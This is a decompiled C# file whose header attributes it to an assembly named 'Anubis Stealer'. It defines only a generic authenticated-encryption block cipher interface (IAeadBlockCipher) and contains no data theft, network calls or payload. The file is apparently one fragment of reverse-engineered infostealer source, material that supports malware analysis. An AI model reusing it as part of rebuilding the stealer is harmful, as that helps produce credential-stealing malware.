// Decompiled with JetBrains decompiler
// Type: Anubis.IAeadBlockCipher
// Assembly: Anubis Stealer, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4CC1199D-65A9-4D34-AA4B-98216B1632A3
// Assembly location: C:\Users\Administrator\Downloads\Build.exe

namespace Anubis
{
  public interface IAeadBlockCipher
  {
    string AlgorithmName { get; }

    void Init(bool forEncryption, ICipherParameters parameters);

    int GetBlockSize();

    int ProcessByte(byte input, byte[] outBytes, int outOff);

    int ProcessBytes(byte[] inBytes, int inOff, int len, byte[] outBytes, int outOff);

    int DoFinal(byte[] outBytes, int outOff);

    byte[] GetMac();

    int GetUpdateOutputSize(int len);

    int GetOutputSize(int len);

    void Reset();
  }
}
